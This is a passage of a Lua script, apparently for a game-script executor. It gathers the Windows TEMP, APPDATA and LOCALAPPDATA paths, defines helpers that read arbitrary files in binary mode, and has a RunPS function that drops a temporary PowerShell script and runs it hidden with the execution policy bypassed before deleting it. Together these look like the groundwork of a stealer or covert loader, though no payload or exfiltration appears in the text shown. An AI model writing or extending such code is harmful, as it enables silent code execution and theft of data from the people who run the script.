end

local TEMP = os.getenv("TEMP") or "C:\\Windows\\Temp"
local APPDATA = os.getenv("APPDATA") or ""
local LOCAL = os.getenv("LOCALAPPDATA") or ""

local function FE(p)
    if not p then return false end
    local f = io.open(p,"r")
    if f then f:close() return true end
    return false
end

local function ReadF(p)
    if not FE(p) then return nil end
    local f=io.open(p,"rb")
    if not f then return nil end
    local c=f:read("*a") f:close() return c
end

local function RunPS(s)
    local tmp = TEMP.."\\sg_"..tostring(os.time())..".ps1"
    local f = io.open(tmp,"w") if not f then return "" end
    f:write(s) f:close()
    local h = io.popen('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "'..tmp..'"')
    if not h then pcall(os.remove,tmp) return "" end
    local r = h:read("*a") or "" h:close()
    pcall(os.remove,tmp)
    return r
end

-- safe task wrapper (some executors lack `task` global)
local function taskSpawn(fn)
    if task and task.spawn then
        task.spawn(fn)
    elseif coroutine then
        coroutine.wrap(fn)()
    else
        spawn(fn)
    end
end

local function taskWait(s)
    if task and task.wait then
        task.wait(s)
    else
        wait(s)
    end
end

